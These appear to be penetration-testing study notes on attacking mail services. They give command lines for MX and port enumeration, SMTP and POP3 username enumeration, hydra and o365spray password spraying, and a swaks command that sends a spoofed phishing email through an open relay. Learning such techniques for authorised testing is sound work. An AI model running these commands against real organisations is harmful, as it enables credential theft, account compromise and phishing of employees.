![[Pasted image 20230404185922.png|700]]

## Enumeration
- Email servers are complex
- Today most companies have their email services in the cloud.
- We can use the MX DNS record to identify a mail server.
- We can use `host`, `dig` or [MXToolbox](https://mxtoolbox.com/) to query MX records
``` bash
host -t MX target.com

dig mx target.com | grep "MX" | grep -v ";"

host -t A mail1.target.com
```
- If we are targeting a custom mail server implementation we can enumerate the following ports
	- TCP/25 - SMTP Unencrypted
	- TCP/143 - IMAP4 Unencrypted
	- TCP/110 - POP3 Unencrypted
	- TCP/465 - SMTP Encrypted
	- TCP/993 - IMAP4 Encrypted
	- TCP/995 - POP3 Encrypted
``` bash
sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 <IP>
```

### Misconfigurations
- SMTP servers have different commands that can be used to enumerate valid usernames
	- `VRFY`, `EXPN`, `RCPT TO` 
	- If we sucessfully enumerate valid usernames we can attempt to password spray

#### SMTP - VRFY Command
- This command instructs the SMTP server to check if a username is valid. This feature can be disabled.
	- `252` indicates success
	- `550` indicates unknown user
- `VRFY root`

#### SMTP - EXPN Command
- Similiar to `VRFY` execept when used with a distribution list, will list all users. Some sites have the "all" alias
- `EXPN all`

#### SMTP - RCPT TO Command
- `RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
![[2023-04-05 12_39_16-Hack The Box - Academy.png|400]]

#### POP3 - User Command
- We can use the command `USER` followed by a username. A valid user returns `OK` and an invalid returns `ERR`

#### Automated Enumeration
- We can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
	- Specify enumeration mode with `-M` followed by `VRFY`, `EXPN`, `RCPT` and `-U` with a file containing the users we want to enumerate. Add the domain with `-D` and specify the target with `-t`
``` bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration - O365 Spray
- [O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365

#### Validate target domain
``` bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

#### Enumerate Usernames
```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Password Attacks
#### Hydra
- For locally hosted email using SMTP, POP3, or IMAP4 we can use hydra
``` bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
- If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
	- These must be up to date because if the service changes something the tools may not work.
#### O365 Spray - Password Spraying
``` bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```


## Protocol Specific Attacks
#### Open Relay
- Can be abused for phishing or email spoofing
- Can be id'd  with nmap
``` bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
- Then we can use any mail clien tto connect to the server and send our email
``` bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```